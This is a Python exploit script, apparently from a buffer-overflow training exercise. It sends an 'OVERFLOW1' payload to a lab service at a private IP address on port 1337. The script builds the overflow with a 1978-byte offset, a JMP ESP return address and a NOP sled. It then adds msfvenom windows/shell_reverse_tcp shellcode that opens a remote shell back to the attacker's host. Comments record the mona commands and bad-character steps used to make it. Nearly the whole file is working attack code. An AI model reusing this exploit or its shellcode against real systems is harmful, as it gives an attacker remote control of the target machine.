#!/usr/bin/env python3
import socket


#ip:port
ip = "10.10.224.30"
port = 1337

prefix = "OVERFLOW1"

# ./pattern_create.rb -l 2400
# !mona config set workingdir c:\mona\%p
# !mona findmsp -distance 2400
offset = 1978

# Bunch of A's
overflow = "A" * offset

#retn = "BBBB" # Find EIP
retn = "\xaf\x11\x50\x62" # Find Jump Point (!mona jmp -r esp -cpb "\x00\x07\x2e\xa0")

# Prepend NOPs
#padding = ""
padding = "\x90" * 16

# !mona bytearray -b "\x00,\x07..etc"
# !mona compare -f c:\mona\oscp\bytearray.bin [ESP]

# default bytearray without \x00
#payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# removed badchars: \x00,\x07,\x2e\xa0
# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
payload = ("\xbd\x6b\xc4\xce\x13\xdd\xc7\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x68\x12\x03\x68\x12\x83\xab\xc0\x2c\xe6\xd7\x21\x32"
"\x09\x27\xb2\x53\x83\xc2\x83\x53\xf7\x87\xb4\x63\x73\xc5\x38"
"\x0f\xd1\xfd\xcb\x7d\xfe\xf2\x7c\xcb\xd8\x3d\x7c\x60\x18\x5c"
"\xfe\x7b\x4d\xbe\x3f\xb4\x80\xbf\x78\xa9\x69\xed\xd1\xa5\xdc"
"\x01\x55\xf3\xdc\xaa\x25\x15\x65\x4f\xfd\x14\x44\xde\x75\x4f"
"\x46\xe1\x5a\xfb\xcf\xf9\xbf\xc6\x86\x72\x0b\xbc\x18\x52\x45"
"\x3d\xb6\x9b\x69\xcc\xc6\xdc\x4e\x2f\xbd\x14\xad\xd2\xc6\xe3"
"\xcf\x08\x42\xf7\x68\xda\xf4\xd3\x89\x0f\x62\x90\x86\xe4\xe0"
"\xfe\x8a\xfb\x25\x75\xb6\x70\xc8\x59\x3e\xc2\xef\x7d\x1a\x90"
"\x8e\x24\xc6\x77\xae\x36\xa9\x28\x0a\x3d\x44\x3c\x27\x1c\x01"
"\xf1\x0a\x9e\xd1\x9d\x1d\xed\xe3\x02\xb6\x79\x48\xca\x10\x7e"
"\xaf\xe1\xe5\x10\x4e\x0a\x16\x39\x95\x5e\x46\x51\x3c\xdf\x0d"
"\xa1\xc1\x0a\x81\xf1\x6d\xe5\x62\xa1\xcd\x55\x0b\xab\xc1\x8a"
"\x2b\xd4\x0b\xa3\xc6\x2f\xdc\xc6\x1d\x0b\xcd\xbf\x23\x53\xfc"
"\x63\xad\xb5\x94\x8b\xfb\x6e\x01\x35\xa6\xe4\xb0\xba\x7c\x81"
"\xf3\x31\x73\x76\xbd\xb1\xfe\x64\x2a\x32\xb5\xd6\xfd\x4d\x63"
"\x7e\x61\xdf\xe8\x7e\xec\xfc\xa6\x29\xb9\x33\xbf\xbf\x57\x6d"
"\x69\xdd\xa5\xeb\x52\x65\x72\xc8\x5d\x64\xf7\x74\x7a\x76\xc1"
"\x75\xc6\x22\x9d\x23\x90\x9c\x5b\x9a\x52\x76\x32\x71\x3d\x1e"
"\xc3\xb9\xfe\x58\xcc\x97\x88\x84\x7d\x4e\xcd\xbb\xb2\x06\xd9"
"\xc4\xae\xb6\x26\x1f\x6b\xd6\xc4\xb5\x86\x7f\x51\x5c\x2b\xe2"
"\x62\x8b\x68\x1b\xe1\x39\x11\xd8\xf9\x48\x14\xa4\xbd\xa1\x64"
"\xb5\x2b\xc5\xdb\xb6\x79")
 
#payload = "\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""


buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
